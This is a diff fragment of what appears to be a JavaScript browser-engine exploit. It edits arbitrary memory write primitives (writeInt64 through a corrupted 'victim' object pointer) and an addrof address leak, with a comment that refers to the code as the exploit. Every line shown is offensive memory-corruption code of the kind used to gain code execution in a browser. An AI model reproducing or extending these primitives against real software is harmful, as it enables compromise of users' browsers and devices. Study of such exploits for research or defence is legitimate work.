@@ -568,7 +568,7 @@ var VM_PROT_EXECUTE = 0x4
         // Write an int64 to the given address.
         writeInt64(addr, int64) {
             hax[1] = Add(addr, new Int64(0x10)).asDouble();
-            victim.pointer = int64.asJSValue();
+            victim.pointer = int64;
         },
 
         // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
@@ -622,7 +622,7 @@ var VM_PROT_EXECUTE = 0x4
     // Testing code, not related to exploit
     var plainObj = {};
     var header = memory.read64(addrof(plainObj));
-    memory.writeInt64(memory.addrof(container), header);
+    memory.writeInt64(addrof(container), header);
     //memory.test();
     //let memory.read_i64 = memory.read64;
      
